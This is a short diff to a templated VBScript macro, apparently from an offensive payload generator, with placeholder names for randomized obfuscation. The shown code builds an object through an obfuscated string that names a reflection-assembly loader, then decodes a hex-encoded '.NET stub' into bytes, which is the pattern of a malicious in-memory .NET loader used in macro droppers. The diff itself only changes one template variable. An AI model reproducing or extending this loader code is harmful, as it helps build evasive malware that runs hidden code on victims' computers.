@@ -178,7 +178,7 @@ Sub {{ v.sub_run }}()
     Next
 
     Dim loader: Set loader = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
-    Dim stub_hex: stub_hex = "{{ v.dotnet_stub_hex }}"
+    Dim stub_hex: stub_hex = "{{ dotnet_stub_hex }}"
     Dim stub_bytes(): ReDim stub_bytes(Len(stub_hex) / 2 - 1)
     For i = 0 To Len(stub_hex) / 2 - 1
         stub_bytes(i) = CInt("&H" & Mid(stub_hex, i * 2 + 1, 2))
